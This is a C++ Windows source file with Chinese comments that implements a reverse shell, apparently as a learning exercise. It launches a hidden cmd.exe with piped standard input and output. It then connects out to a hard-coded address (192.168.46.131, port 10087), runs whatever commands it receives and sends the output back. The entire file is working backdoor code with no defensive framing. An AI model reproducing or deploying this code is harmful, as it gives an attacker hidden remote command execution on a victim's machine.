
#include <iostream>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")
using namespace std;
HANDLE hMyWrite, hMyRead, hCmdWrite, hCmdRead;


WORD	wVersionRequested;
WSADATA	wsaData;
SOCKET	hSocketWait;		//专门用于等待连接的socket

BOOL _InitCmd();
BOOL _InitClient();
int main(int argc, char* argv[])
{
	_InitCmd();
	_InitClient();



	DWORD	dwSize;
	char	szBuffer[256] = { 0 };
	char	szBuffer1[0x256] = { 0 };
	char	szBuffer2[0x1000] = { 0 };
	
	





	//2. 主动连接服务器
	sockaddr_in	addr;		//用于描述ip和端口的结构体
	addr.sin_family = AF_INET;				//INET协议簇
	addr.sin_addr.S_un.S_addr = inet_addr("192.168.46.131");	//ip地址
	addr.sin_port = htons(10087);			//端口（需要本地字节序转网络字节序）

	connect(hSocketWait, (sockaddr*)&addr, sizeof(sockaddr_in));				//主动连接服务端





	//3.send/recv
	while (TRUE)
	{
		recv(hSocketWait, szBuffer, sizeof(szBuffer), 0);							//接收来自服务端的消息
		lstrcat(szBuffer, TEXT("\r\n"));

		WriteFile(hMyWrite, szBuffer, lstrlen(szBuffer), NULL, NULL);				//向管道中写入数据
		Sleep(100);
		int i = 0;
		while (1)
		{
			memset(szBuffer1, 0, sizeof(szBuffer1));
			ReadFile(hMyRead, szBuffer1, 256, &dwSize, NULL);						//从管道中读取数据
			lstrcat(szBuffer2, szBuffer1);
			if (dwSize != 256)
				break;
			i++;
		}

		send(hSocketWait, szBuffer2, sizeof(szBuffer2), 0);							//将数据发送回服务端

	}



	//4.closesocket关闭
	closesocket(hSocketWait);




	//结束操作
	WSACleanup();



	return 0;
}


//初始化cmd，创建管道和进程
BOOL _InitCmd()
{

	SECURITY_ATTRIBUTES	as;
	as.nLength				= sizeof(SECURITY_ATTRIBUTES);
	as.bInheritHandle		= TRUE;							//管道句柄可继承
	as.lpSecurityDescriptor = NULL;
	CreatePipe(&hCmdRead, &hMyWrite, &as, 0);			// my ----> cmd  管道
	CreatePipe(&hMyRead, &hCmdWrite, &as, 0);			// my <---- cmd	 管道


	STARTUPINFO			si;
	PROCESS_INFORMATION	pi;
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES;					//意思是可以更改cmd的标准输入输出
	si.hStdInput = hCmdRead;
	si.hStdOutput = hCmdWrite;
	si.hStdError = hCmdWrite;

	CreateProcess(TEXT("C:\\Windows\\System32\\cmd.exe"),
		NULL,
		NULL,
		NULL,
		TRUE,	//继承
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi);

	return 1;
}




//初始化客户端

BOOL _InitClient()
{
	//windows很特殊，需要单独调用api来进行网络的初始化与结束处理


	wVersionRequested = MAKEWORD(2, 2);
	WSAStartup(wVersionRequested, &wsaData);


	//1.创建套接字
	
	hSocketWait = socket(
		AF_INET,	//INET协议簇
		SOCK_STREAM,//表示使用的是TCP协议
		0);
	return 1;
}